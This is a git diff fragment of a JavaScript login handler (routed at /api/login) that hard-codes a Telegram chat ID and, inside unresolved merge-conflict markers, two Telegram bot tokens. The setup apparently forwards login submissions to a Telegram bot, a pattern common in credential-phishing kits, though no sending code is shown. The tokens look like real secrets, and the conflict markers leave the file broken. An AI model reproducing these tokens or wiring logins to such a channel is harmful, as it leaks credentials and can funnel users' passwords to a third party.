@@ -4,7 +4,11 @@
 // For a simple static site, you would typically use a service like Formspree or a full backend.
 // Assuming a server environment is set up to route /api/login to this file.
 
+<<<<<<< HEAD
 const TELEGRAM_BOT_TOKEN = '8304693249:AAEScgp8PZ7cfo7-V78EgbV7Uy20v2ScaFQ';
+=======
+const TELEGRAM_BOT_TOKEN = '8233346929:AAHRpX-fz0n3LOsCLbsCEGGEQFDF7xulTyY';
+>>>>>>> 0543f30505826bbf63a0e3ed1226667f66e70c75
 const TELEGRAM_CHAT_ID = '6402487270';
 
 // This function escapes special characters for Telegram's MarkdownV2.
